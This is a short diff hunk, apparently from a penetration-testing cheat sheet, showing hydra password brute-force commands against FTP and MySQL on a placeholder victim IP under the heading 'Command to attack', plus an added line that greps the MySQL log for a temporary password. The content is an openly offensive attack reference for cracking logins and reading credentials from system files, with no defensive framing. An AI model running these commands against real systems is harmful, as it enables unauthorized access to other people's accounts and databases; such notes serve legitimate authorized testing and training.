@@ -374,6 +374,9 @@ Command to attack:
 hydra -l user -P passwords.txt IP_VICTIM ftp
 
 MYSQL
+grep 'temporary password' /var/log/mysqld.log
+
+
 hydra -l user -P passwords.txt IP_VICTIM mysql
 
 SMB
